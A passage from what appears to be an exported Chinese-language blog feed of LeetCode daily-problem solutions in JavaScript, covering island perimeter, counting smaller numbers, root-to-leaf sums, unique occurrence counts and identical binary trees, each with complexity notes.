<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> islandPerimeter = <span class="function"><span class="keyword">function</span>(<span class="params">grid</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="function"><span class="title">for</span>(<span class="params"><span class="keyword">let</span> i = <span class="number">0</span>; i &lt; grid.length; i++</span>)</span>&#123;</span><br><span class="line">        <span class="function"><span class="title">for</span>(<span class="params"><span class="keyword">let</span> j = <span class="number">0</span>; j &lt; grid[i].length; j++</span>)</span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(i+<span class="string">&#x27;+&#x27;</span>+j);</span><br><span class="line">            <span class="function"><span class="title">if</span>(<span class="params">grid[i][j] === <span class="number">1</span></span>)</span>&#123;</span><br><span class="line">                <span class="function"><span class="title">if</span>(<span class="params">i !== <span class="number">0</span> &amp;&amp; grid[i-<span class="number">1</span>][j] ===<span class="number">0</span></span>)</span>&#123;</span><br><span class="line">                    <span class="built_in">console</span>.log(<span class="string">&#x27;i !== 0&#x27;</span>);</span><br><span class="line">                    sum += <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="function"><span class="title">if</span>(<span class="params">(i !== grid.length-<span class="number">1</span>) &amp;&amp; grid[i+<span class="number">1</span>][j] === <span class="number">0</span></span>)</span>&#123;</span><br><span class="line">                    <span class="built_in">console</span>.log(<span class="string">&#x27;i !== length&#x27;</span>);</span><br><span class="line">                    sum += <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="function"><span class="title">if</span>(<span class="params">j !== <span class="number">0</span> &amp;&amp; grid[i][j-<span class="number">1</span>] === <span class="number">0</span></span>)</span>&#123;</span><br><span class="line">                    <span class="built_in">console</span>.log(<span class="string">&#x27;j !== 0&#x27;</span>);</span><br><span class="line">                    sum += <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="function"><span class="title">if</span>(<span class="params">(j !== grid[i].length-<span class="number">1</span>) &amp;&amp; grid[i][j+<span class="number">1</span>] === <span class="number">0</span></span>)</span>&#123;</span><br><span class="line">                    <span class="built_in">console</span>.log(<span class="string">&#x27;j !== length&#x27;</span>);</span><br><span class="line">                    sum += <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="function"><span class="title">if</span>(<span class="params">i === <span class="number">0</span></span>)</span>&#123;</span><br><span class="line">                    <span class="built_in">console</span>.log(<span class="string">&#x27;i+1&#x27;</span>);</span><br><span class="line">                    sum += <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="function"><span class="title">if</span>(<span class="params">j === <span class="number">0</span></span>)</span>&#123;</span><br><span class="line">                    <span class="built_in">console</span>.log(<span class="string">&#x27;j+1&#x27;</span>);</span><br><span class="line">                    sum += <span class="number">1</span></span><br><span class="line">                &#125;</span><br><span class="line">                <span class="function"><span class="title">if</span>(<span class="params">i === grid.length-<span class="number">1</span></span>)</span>&#123;</span><br><span class="line">                    <span class="built_in">console</span>.log(<span class="string">&#x27;i+1&#x27;</span>);</span><br><span class="line">                    sum += <span class="number">1</span></span><br><span class="line">                &#125;</span><br><span class="line">                <span class="function"><span class="title">if</span>(<span class="params">j === grid[i].length-<span class="number">1</span></span>)</span>&#123;</span><br><span class="line">                    <span class="built_in">console</span>.log(<span class="string">&#x27;j+1&#x27;</span>);</span><br><span class="line">                    sum += <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="方法2-–-暴力循环-四个方法判断"><a href="#方法2-–-暴力循环-四个方法判断" class="headerlink" title="方法2 – 暴力循环+四个方法判断"></a>方法2 – 暴力循环+四个方法判断</h3><ul>
<li>对于一个陆地格子的每条边，我们可以把陆地的四条边都加上sum，然后判断他的四条边是否有陆地，有的话则sub+1，最后用sum减去sub得到周长</li>
<li>时间复杂度：O(nm)，其中 nn 为网格的高度，m 为网格的宽度。我们需要遍历每个格子</li>
<li>空间复杂度：O(2)。只需要常数空间存放若干变量<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> islandPerimeter = <span class="function"><span class="keyword">function</span>(<span class="params">grid</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">let</span> sub = <span class="number">0</span>;</span><br><span class="line">    <span class="function"><span class="title">for</span>(<span class="params"><span class="keyword">let</span> i = <span class="number">0</span>; i &lt; grid.length; i++</span>)</span>&#123;</span><br><span class="line">        <span class="function"><span class="title">for</span>(<span class="params"><span class="keyword">let</span> j = <span class="number">0</span>; j &lt; grid[i].length; j++</span>)</span>&#123;</span><br><span class="line">            <span class="function"><span class="title">if</span>(<span class="params">grid[i][j] === <span class="number">1</span></span>)</span>&#123;</span><br><span class="line">                sum += <span class="number">4</span>;</span><br><span class="line">                <span class="function"><span class="title">if</span>(<span class="params">i !== <span class="number">0</span> &amp;&amp; grid[i-<span class="number">1</span>][j] === <span class="number">1</span></span>)</span>&#123;</span><br><span class="line">                    sub += <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="function"><span class="title">if</span>(<span class="params">(i !== grid.length-<span class="number">1</span>) &amp;&amp; grid[i+<span class="number">1</span>][j] === <span class="number">1</span></span>)</span>&#123;</span><br><span class="line">                    sub += <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="function"><span class="title">if</span>(<span class="params">j !== <span class="number">0</span> &amp;&amp; grid[i][j-<span class="number">1</span>] === <span class="number">1</span></span>)</span>&#123;</span><br><span class="line">                    sub += <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="function"><span class="title">if</span>(<span class="params">(j !== grid[i].length-<span class="number">1</span>) &amp;&amp; grid[i][j+<span class="number">1</span>] === <span class="number">1</span></span>)</span>&#123;</span><br><span class="line">                    sub += <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    sum = sum - sub;</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
</li>
</ul>
]]></content>
      <categories>
        <category>数组算法</category>
      </categories>
      <tags>
        <tag>数组</tag>
        <tag>算法</tag>
        <tag>力扣每日一题</tag>
      </tags>
  </entry>
  <entry>
    <title>有多少小于当前数字的数字</title>
    <url>/2020/11/10/%E6%9C%89%E5%A4%9A%E5%B0%91%E5%B0%8F%E4%BA%8E%E5%BD%93%E5%89%8D%E6%95%B0%E5%AD%97%E7%9A%84%E6%95%B0%E5%AD%97/</url>
    <content><![CDATA[<h2 id="有多少小于当前数字的数字"><a href="#有多少小于当前数字的数字" class="headerlink" title="有多少小于当前数字的数字"></a>有多少小于当前数字的数字</h2><ul>
<li>给你一个数组 nums，对于其中每个元素 nums[i]，请你统计数组中比它小的所有数字的数目。换而言之，对于每个 nums[i] 你必须计算出有效的 j 的数量，其中 j 满足 j != i 且 nums[j] &lt; nums[i] 。以数组形式返回答案。</li>
<li>初始化数组<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> nums = [<span class="number">8</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br></pre></td></tr></table></figure>
<h3 id="方法1-–-暴力循环"><a href="#方法1-–-暴力循环" class="headerlink" title="方法1 – 暴力循环"></a>方法1 – 暴力循环</h3></li>
<li>对于数组中的每一个元素，我们都遍历数组一次，统计小于当前元素的数的数目</li>
<li>时间复杂度：O(N^2)，其中 NN 为数组的长度。</li>
<li>空间复杂度：O(1)。注意我们不计算答案数组的空间占用<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> smallerNumbersThanCurrent = <span class="function"><span class="keyword">function</span>(<span class="params">nums</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> num = [];</span><br><span class="line">    <span class="function"><span class="title">for</span>(<span class="params"><span class="keyword">let</span> i = <span class="number">0</span>; i &lt; nums.length; i++</span>)</span>&#123;</span><br><span class="line">        <span class="comment">//初始化数目</span></span><br><span class="line">        <span class="keyword">let</span> sub = <span class="number">0</span>;</span><br><span class="line">        <span class="function"><span class="title">for</span>(<span class="params"><span class="keyword">let</span> j = <span class="number">0</span>; j != i, j &lt; nums.length; j++</span>)</span>&#123;</span><br><span class="line">            <span class="comment">//当j&gt;i时，数目加1</span></span><br><span class="line">            <span class="function"><span class="title">if</span>(<span class="params">nums[i] &gt; nums[j]</span>)</span>&#123;</span><br><span class="line">                sub++</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        num.push(sub);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> num;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="方法2-–-快速排序"><a href="#方法2-–-快速排序" class="headerlink" title="方法2 – 快速排序"></a>方法2 – 快速排序</h3></li>
<li>将数组排序，并记录每一个数在原数组中的位置。对于排序后的数组中的每一个数，我们找出其左侧第一个小于它的数，这样就能够知道数组中小于该数的数量</li>
<li>时间复杂度：O(N\log N)，其中 N 为数组的长度。排序需要 O(N\log N) 的时间，随后需要 O(N) 时间来遍历。</li>
<li>空间复杂度：O(N)。因为要额外开辟一个数组<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> smallerNumbersThanCurrent = <span class="function"><span class="keyword">function</span>(<span class="params">nums</span>) </span>&#123;</span><br><span class="line">    <span class="comment">//新建二维数组</span></span><br><span class="line">    <span class="keyword">const</span> data = <span class="keyword">new</span> <span class="built_in">Array</span>(nums.length).fill(<span class="number">0</span>).map(<span class="function"><span class="params">v</span> =&gt;</span> <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">2</span>).fill(<span class="number">0</span>));</span><br><span class="line">    <span class="comment">//给二维数组赋值，第一个为数字，第二个为数组原本下标</span></span><br><span class="line">    <span class="function"><span class="title">for</span>(<span class="params"><span class="keyword">let</span> i = <span class="number">0</span>; i &lt; nums.length; i++</span>)</span>&#123;</span><br><span class="line">        data[i][<span class="number">0</span>] = nums[i];</span><br><span class="line">        data[i][<span class="number">1</span>] = i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//按照数字排序</span></span><br><span class="line">    data.sort(<span class="function">(<span class="params">a, b</span>) =&gt;</span> a[<span class="number">0</span>]-b[<span class="number">0</span>]);</span><br><span class="line">    <span class="comment">//新建数组储存结果</span></span><br><span class="line">    <span class="keyword">let</span> ret = <span class="keyword">new</span> <span class="built_in">Array</span>(nums.length);</span><br><span class="line">    <span class="comment">//初始化基准点</span></span><br><span class="line">    <span class="keyword">let</span> prev = -<span class="number">1</span>;</span><br><span class="line">    <span class="function"><span class="title">for</span>(<span class="params"><span class="keyword">let</span> i = <span class="number">0</span>; i &lt; nums.length; i++</span>)</span>&#123;</span><br><span class="line">        <span class="comment">//如果基准点是初始值或这个值不等于前一个值，则基准点移动到i</span></span><br><span class="line">        <span class="function"><span class="title">if</span>(<span class="params">prev === -<span class="number">1</span> || data[i][<span class="number">0</span>] !== data[i-<span class="number">1</span>][<span class="number">0</span>]</span>)</span>&#123;</span><br><span class="line">            prev = i;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//利用二维数组储存的下标赋值结果</span></span><br><span class="line">        ret[data[i][<span class="number">1</span>]] = prev</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="方法3-–-计数排序"><a href="#方法3-–-计数排序" class="headerlink" title="方法3 – 计数排序"></a>方法3 – 计数排序</h3></li>
<li>注意到数组元素的值域为 [0,100][0,100]，所以可以考虑建立一个频次数组 cntcnt ，cnt[i]cnt[i] 表示数字 ii 出现的次数。那么对于数字 ii 而言，小于它的数目就为 cnt[0…i-1]cnt[0…i−1] 的总和</li>
<li>时间复杂度：O(N + K)，其中 K 为值域大小。需要遍历两次原数组，同时遍历一次频次数组 cnt找出前缀和</li>
<li>空间复杂度：O(K)。因为要额外开辟一个值域大小的数组</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> smallerNumbersThanCurrent = <span class="function"><span class="keyword">function</span>(<span class="params">nums</span>) </span>&#123;</span><br><span class="line">    <span class="comment">//创建一个长度101的数组</span></span><br><span class="line">    <span class="keyword">const</span> cnt = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">101</span>).fill(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">const</span> n = nums.length;</span><br><span class="line">    <span class="comment">//遍历nums，使大数组中下标为nums值的地方+1</span></span><br><span class="line">    <span class="function"><span class="title">for</span>(<span class="params"><span class="keyword">let</span> i = <span class="number">0</span>; i &lt; n; ++i</span>)</span>&#123;</span><br><span class="line">        cnt[nums[i]] += <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//遍历大数组，从0加到100 </span></span><br><span class="line">    <span class="function"><span class="title">for</span>(<span class="params"><span class="keyword">let</span> i = <span class="number">1</span>; i &lt;= <span class="number">100</span>; ++i</span>)</span>&#123;</span><br><span class="line">        cnt[i] += cnt[i - <span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">const</span> ret = [];</span><br><span class="line">    <span class="comment">// 将下标为小数组值-1的值提出，就是这个值前有几个数字</span></span><br><span class="line">    <span class="function"><span class="title">for</span>(<span class="params"><span class="keyword">let</span> i = <span class="number">0</span>; i &lt; n;++i</span>)</span>&#123;</span><br><span class="line">        ret.push(nums[i] ? cnt[nums[i] - <span class="number">1</span>] : <span class="number">0</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>数组算法</category>
      </categories>
      <tags>
        <tag>数组</tag>
        <tag>算法</tag>
        <tag>力扣每日一题</tag>
      </tags>
  </entry>
  <entry>
    <title>求根到叶子节点数字之和</title>
    <url>/2020/11/10/%E6%B1%82%E6%A0%B9%E5%88%B0%E5%8F%B6%E5%AD%90%E8%8A%82%E7%82%B9%E6%95%B0%E5%AD%97%E4%B9%8B%E5%92%8C/</url>
    <content><![CDATA[<h2 id="求根到叶子节点数字之和"><a href="#求根到叶子节点数字之和" class="headerlink" title="求根到叶子节点数字之和"></a>求根到叶子节点数字之和</h2><ul>
<li>初始化<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//初始化二叉树</span></span><br><span class="line"><span class="comment">//[1,2,3]</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">TreeNode</span>(<span class="params">val, left, right</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">this</span>.val = (val === <span class="literal">undefined</span> ? <span class="number">0</span> : val)</span><br><span class="line">    <span class="built_in">this</span>.left = (left === <span class="literal">undefined</span> ? <span class="literal">null</span> : left)</span><br><span class="line">    <span class="built_in">this</span>.right = (right === <span class="literal">undefined</span> ? <span class="literal">null</span> : right)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> root = <span class="keyword">new</span> TreeNode(<span class="number">1</span>);</span><br><span class="line">root.left = <span class="keyword">new</span> TreeNode(<span class="number">2</span>);</span><br><span class="line">root.right = <span class="keyword">new</span> TreeNode(<span class="number">3</span>);</span><br></pre></td></tr></table></figure>
<h3 id="方法1-–-深度遍历"><a href="#方法1-–-深度遍历" class="headerlink" title="方法1 – 深度遍历"></a>方法1 – 深度遍历</h3></li>
<li>从根节点开始，遍历每个节点，如果遇到叶子节点，则将叶子节点对应的数字加到数字之和。如果当前节点不是叶子节点，则计算其子节点对应的数字，然后对子节点递归遍历</li>
<li>时间复杂度：O(n)，其中 n 是二叉树的节点个数。对每个节点访问一次。</li>
<li>空间复杂度：O(n)，其中 n 是二叉树的节点个数。空间复杂度主要取决于递归调用的栈空间，递归栈的深度等于二叉树的高度，最坏情况下，二叉树的高度等于节点个数，空间复杂度为 O(n)<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> sumNumbers = <span class="function"><span class="keyword">function</span>(<span class="params">root</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> dfs(root, <span class="number">0</span>)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">dfs</span>(<span class="params">root,sum</span>)</span>&#123;</span><br><span class="line">    <span class="function"><span class="title">if</span>(<span class="params">root === <span class="literal">null</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    sum = sum * <span class="number">10</span> + root.val;</span><br><span class="line">    <span class="function"><span class="title">if</span>(<span class="params">root.left === <span class="literal">null</span> &amp;&amp; root.right === <span class="literal">null</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> sum;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> dfs(root.left,sum) + dfs(root.right,sum);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h3 id="方法2-–-广度遍历"><a href="#方法2-–-广度遍历" class="headerlink" title="方法2 – 广度遍历"></a>方法2 – 广度遍历</h3><ul>
<li>初始时，将根节点和根节点的值分别加入两个队列。每次从两个队列分别取出一个节点和一个数字，进行如下操作:<ul>
<li>如果当前节点是叶子节点，则将该节点对应的数字加到数字之和</li>
<li>如果当前节点不是叶子节点，则获得当前节点的非空子节点，并根据当前节点对应的数字和子节点的值计算子节点对应的数字，然后将子节点和子节点对应的数字分别加入两个队列</li>
</ul>
</li>
<li>搜索结束后，即可得到所有叶子节点对应的数字之和</li>
<li>时间复杂度：O(n)，其中 n 是二叉树的节点个数。对每个节点访问一次。</li>
<li>空间复杂度：O(n)，其中 n 是二叉树的节点个数。空间复杂度主要取决于队列，每个队列中的元素个数不会超过 n<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> sumNumbers2 = <span class="function"><span class="keyword">function</span>(<span class="params">root</span>) </span>&#123;</span><br><span class="line">    <span class="function"><span class="title">if</span>(<span class="params">root === <span class="literal">null</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">let</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">let</span> stack1 = [];</span><br><span class="line">    <span class="keyword">let</span> stack2 = [];</span><br><span class="line">    stack1.push(root);</span><br><span class="line">    stack2.push(root.val);</span><br><span class="line">    <span class="function"><span class="title">while</span>(<span class="params">stack1.length !== <span class="number">0</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">let</span> node = stack1.shift();</span><br><span class="line">        <span class="keyword">let</span> num = stack2.shift();</span><br><span class="line">        <span class="function"><span class="title">if</span>(<span class="params">node.left === <span class="literal">null</span> &amp;&amp; node.right === <span class="literal">null</span></span>)</span>&#123;</span><br><span class="line">            sum += num;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="function"><span class="title">if</span>(<span class="params">node.left !== <span class="literal">null</span></span>)</span>&#123;</span><br><span class="line">                stack1.push(node.left);</span><br><span class="line">                stack2.push(node.left.val + num * <span class="number">10</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="function"><span class="title">if</span>(<span class="params">node.right !== <span class="literal">null</span></span>)</span>&#123;</span><br><span class="line">                stack1.push(node.right);</span><br><span class="line">                stack2.push(node.right.val + num * <span class="number">10</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
</li>
</ul>
]]></content>
      <categories>
        <category>二叉树算法</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>力扣每日一题</tag>
        <tag>二叉树</tag>
      </tags>
  </entry>
  <entry>
    <title>独一无二的出现次数</title>
    <url>/2020/11/10/%E7%8B%AC%E4%B8%80%E6%97%A0%E4%BA%8C%E7%9A%84%E5%87%BA%E7%8E%B0%E6%AC%A1%E6%95%B0/</url>
    <content><![CDATA[<h2 id="独一无二的出现次数"><a href="#独一无二的出现次数" class="headerlink" title="独一无二的出现次数"></a>独一无二的出现次数</h2><ul>
<li>给你一个整数数组 arr，请你帮忙统计数组中每个数的出现次数。如果每个数的出现次数都是独一无二的，就返回 true；否则返回 false。</li>
<li>初始化<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">3</span>]</span><br></pre></td></tr></table></figure>
<h3 id="方法1-–-使用哈希表"><a href="#方法1-–-使用哈希表" class="headerlink" title="方法1 – 使用哈希表"></a>方法1 – 使用哈希表</h3></li>
<li>使用map表记录，格式为[数字，数字出现次数]，之后用数组记录下map表中所有数字出现的次数，数组排序后判断数组中是否有重复的数，有则返回false，否则返回true</li>
<li>时间复杂度：O(N)，其中 N 为数组的长度。遍历原始数组需要 O(N) 时间，而遍历中间过程产生的哈希表又需要 O(N) 的时间，遍历结果数组需要 O(N) 的时间</li>
<li>空间复杂度：O(N)<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> uniqueOccurrences = <span class="function"><span class="keyword">function</span>(<span class="params">arr</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> map = <span class="keyword">new</span> <span class="built_in">Map</span>();</span><br><span class="line">    <span class="function"><span class="title">for</span>(<span class="params"><span class="keyword">let</span> i = <span class="number">0</span>; i　&lt; arr.length; i++</span>)</span>&#123;</span><br><span class="line">        <span class="function"><span class="title">if</span>(<span class="params">map.has(arr[i])</span>)</span>&#123;</span><br><span class="line">            map.set(arr[i],<span class="built_in">parseInt</span>(map.get(arr[i])+<span class="number">1</span>))</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            map.set(arr[i],<span class="number">1</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">let</span> result = [];</span><br><span class="line">    <span class="function"><span class="title">for</span>(<span class="params"><span class="keyword">let</span> key <span class="keyword">of</span> map.values()</span>)</span>&#123;</span><br><span class="line">        result.push(key);</span><br><span class="line">    &#125;</span><br><span class="line">    result.sort();</span><br><span class="line">    <span class="function"><span class="title">for</span>(<span class="params"><span class="keyword">let</span> i = <span class="number">0</span>; i &lt; result.length; i++</span>)</span>&#123;</span><br><span class="line">        <span class="function"><span class="title">if</span>(<span class="params">result[i] === result[i+<span class="number">1</span>]</span>)</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h3 id="方法2-–-哈希表结合Set"><a href="#方法2-–-哈希表结合Set" class="headerlink" title="方法2 – 哈希表结合Set()"></a>方法2 – 哈希表结合Set()</h3><ul>
<li>使用map表记录，格式为[数字，数字出现次数]，之后用Set对象记录下map表中所有数字出现的次数，由于Set的成员都是唯一的，我们只需比对Set与Map的长度是否一致即可判断次数是否重复</li>
<li>时间复杂度：O(N)，其中 N 为数组的长度。遍历原始数组需要 O(N) 时间，而遍历中间过程产生的哈希表又需要 O(N) 的时间</li>
<li>空间复杂度：O(N)<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> uniqueOccurrences = <span class="function"><span class="keyword">function</span>(<span class="params">arr</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> map = <span class="keyword">new</span> <span class="built_in">Map</span>();</span><br><span class="line">    <span class="function"><span class="title">for</span>(<span class="params"><span class="keyword">let</span> i = <span class="number">0</span>; i &lt;arr.length; i++</span>)</span>&#123;</span><br><span class="line">        <span class="function"><span class="title">if</span>(<span class="params">map.has(arr[i])</span>)</span>&#123;</span><br><span class="line">            <span class="comment">//如果map中存在这个数，则将它原本的value取出加1赋值（使用parseInt()确保相加不会出错）</span></span><br><span class="line">            map.set(arr[i],<span class="built_in">parseInt</span>(map.get(arr[i])+<span class="number">1</span>));</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            map.set(arr[i],<span class="number">1</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">let</span> times = <span class="keyword">new</span> <span class="built_in">Set</span>();</span><br><span class="line">    <span class="function"><span class="title">for</span>(<span class="params"><span class="keyword">let</span> [key, value] <span class="keyword">of</span> map</span>)</span>&#123;</span><br><span class="line">        times.add(value)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> times.size === map.size;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
]]></content>
      <categories>
        <category>数组算法</category>
      </categories>
      <tags>
        <tag>数组</tag>
        <tag>算法</tag>
        <tag>力扣每日一题</tag>
      </tags>
  </entry>
  <entry>
    <title>相同的树</title>
    <url>/2020/11/10/%E7%9B%B8%E5%90%8C%E7%9A%84%E6%A0%91/</url>
    <content><![CDATA[<h2 id="相同的树"><a href="#相同的树" class="headerlink" title="相同的树"></a>相同的树</h2><h3 id="初始化二叉树"><a href="#初始化二叉树" class="headerlink" title="初始化二叉树"></a>初始化二叉树</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//初始化二叉树</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">TreeNode</span>(<span class="params">val, left, right</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">this</span>.val = (val === <span class="literal">undefined</span> ? <span class="number">0</span> : val)</span><br><span class="line">    <span class="built_in">this</span>.left = (left === <span class="literal">undefined</span> ? <span class="literal">null</span> : left)</span><br><span class="line">    <span class="built_in">this</span>.right = (right === <span class="literal">undefined</span> ? <span class="literal">null</span> : right)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//root[1,null,2,3] root2[1,null,2,3]</span></span><br><span class="line"><span class="keyword">let</span> root = <span class="keyword">new</span> TreeNode(<span class="number">1</span>);</span><br><span class="line">root.right = <span class="keyword">new</span> TreeNode(<span class="number">2</span>);</span><br><span class="line">root.right.left = <span class="keyword">new</span> TreeNode(<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> root2 = <span class="keyword">new</span> TreeNode(<span class="number">1</span>);</span><br><span class="line">root2.right = <span class="keyword">new</span> TreeNode(<span class="number">2</span>);</span><br><span class="line">root2.right.left = <span class="keyword">new</span> TreeNode(<span class="number">3</span>);</span><br></pre></td></tr></table></figure>

<h3 id="方法1-–-深度遍历"><a href="#方法1-–-深度遍历" class="headerlink" title="方法1 – 深度遍历"></a>方法1 – 深度遍历</h3><ul>
<li>如果两个二叉树都不为空，那么首先判断它们的根节点的值是否相同，若不相同则两个二叉树一定不同，若相同，再分别判断两个二叉树的左子树是否相同以及右子树是否相同。这是一个递归的过程，因此可以使用深度优先搜索，递归地判断两个二叉树是否相同</li>
<li>时间复杂度：O(min(m,n))，其中 m 和 n 分别是两个二叉树的节点数。对两个二叉树同时进行深度优先搜索，只有当两个二叉树中的对应节点都不为空时才会访问到该节点，因此被访问到的节点数不会超过较小的二叉树的节点数</li>
<li>空间复杂度：O(min(m,n))，其中 m 和 n 分别是两个二叉树的节点数。空间复杂度取决于递归调用的层数，递归调用的层数不会超过较小的二叉树的最大高度，最坏情况下，二叉树的高度等于节点数<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> isSameTree = <span class="function"><span class="keyword">function</span>(<span class="params">p, q</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> dfs(p ,q)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">dfs</span>(<span class="params">p, q</span>)</span>&#123;</span><br><span class="line">    <span class="function"><span class="title">if</span>(<span class="params">p === <span class="literal">null</span> &amp;&amp; q === <span class="literal">null</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="function"><span class="title">if</span>(<span class="params">p === <span class="literal">null</span> || q === <span class="literal">null</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="function"><span class="title">if</span>(<span class="params">p.val === q.val</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> dfs(p.left, q.left) &amp;&amp; dfs(p.right, q.right);</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h3 id="方法2-–-广度遍历"><a href="#方法2-–-广度遍历" class="headerlink" title="方法2 – 广度遍历"></a>方法2 – 广度遍历</h3><ul>
<li>初始时将两个二叉树的根节点分别加入两个队列。每次从两个队列各取出一个节点，进行如下比较操作:<ol>
